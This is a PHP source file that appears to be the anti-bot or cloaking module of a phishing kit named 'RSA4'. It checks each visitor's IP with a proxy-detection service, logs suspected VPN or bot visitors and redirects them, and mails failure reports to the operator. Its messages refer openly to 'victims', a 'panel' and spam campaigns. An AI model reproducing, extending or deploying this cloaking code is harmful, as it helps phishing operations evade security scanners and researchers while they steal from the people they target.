<?php

/*
 
 
 
  Algorithm RSA4, with twin-antibot detection system
 */
error_reporting(-1);

function checkProxy($ip,$switch){
    
    if($switch == 1){
    
		$contactEmail=reciever; //You can change, it's just for error detection
		$timeout=5; //by default, wait no longer than 5 secs for a response
		$banOnProbability=0.9; //if function returns a value higher than this, function returns true, set to 0.99 by default
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
		curl_setopt($ch, CURLOPT_URL, "https://check.getipintel.net/check.php?ip=$ip&contact=$contactEmail");
		$response=curl_exec($ch);
		curl_close($ch);
		
		if ($response > $banOnProbability) {
                 markBot("BLOCKED VPN","../logz/botlist.txt");
				return true;
		} else {
			if ($response < 0 || strcmp($response, "") == 0 ) {
                
                switch ($response) {
                    case -1:
                        $probs = "No input, AP doesn't know how it happened! Switch this off and turn on 'altproxy' for proxy detection";
                        break;
                    case -2:
                        $probs = "Invalid IP address. This could be a problem with your host(panel), Switch this off and turn on 'altproxy' for proxy detection. ";
                        break;
                    case -3:
                        $probs = "Unroutable address / private address! It seems your panel is reporting the wrong IP address of connecting victims, not my problem. Switch this off and turn on 'altproxy' for proxy detection. I'll suggest you switch host entirely since problem isn't from the script";
                        break;
                    case -4:
                        $probs = "Talk to AP about options as currently API is undergoing update or rather still just use altProxy";
                        break;
                    case -5:
                        $probs = "For some wierd reason, you got banned from using the service, probably due to you running high volume of spams on this particular server(goodshit!). Switch this off and turn on 'altproxy' to continue";
                        break;
                    case -6:
                    $probs = "Email address is invalid, that's not possible if you reading this from that same email. I don't know bruh, switch this off and switch on altProxy";
                    break;
                    default:
                        echo "Your host just be tweaking and shit, AP can't detect what went wrong. Find another host or switch this off and switch on altProxy!";
                }
                
                mail($contactEmail, "RSA4: Proxy Detection Failure", "If you are reading this message, then you should contact AP ASAP \n 
                Proxy Detection(proxy_blocker) ran into some problems \n
                Source of Problem: " . $probs . "\n NOTE: If the problem is from your ends, no need to hit me" , "From: <store@H0oligan.com> \r\n");

			}
				return false;
		}
        
        
    }elseif($switch == 0){
        return  false;
    }
    
    
}

$riri = getUserIP();
if (checkProxy($riri,proxy_blocker)) {
	/* A proxy has been detected based on your criteria
	 * and recorded
	 */
    header('location: '.  redirect_to);
	exit();
}

?>